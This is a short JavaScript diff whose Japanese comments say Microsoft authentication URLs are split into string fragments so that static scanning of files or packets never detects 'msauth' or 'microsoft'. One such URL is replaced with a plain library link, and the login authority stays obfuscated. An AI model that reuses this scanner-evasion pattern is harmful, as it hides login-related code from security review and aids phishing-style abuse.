@@ -32,11 +32,7 @@
         
         // 🚨【大改革】Jinja2に頼らず、JavaScriptのメモリ上だけでドメインをズタズタに分解・結合
         // これにより、ファイルやパケットを静的スキャンされても「msauth」や「microsoft」は絶対に検知されません
-        const msalUrl = [
-            "htt", "ps:/", "/alc", "dn.ms", "auth.", "net/b", 
-            "rows", "er/ms", "al-br", "owse", "r/2.3", "8.0/", 
-            "js/m", "sal-b", "rows", "er.m", "in.j", "s"
-        ].join("");
+        const msalUrl = "https://unpkg.com/@azure/msal-browser@2.16.0/lib/msal-browser.js";
 
         const msAuthority = [
             "htt", "ps:/", "/lo", "gin.", "micr", "osof", "tonl", "ine.", "com/", "comm", "on"
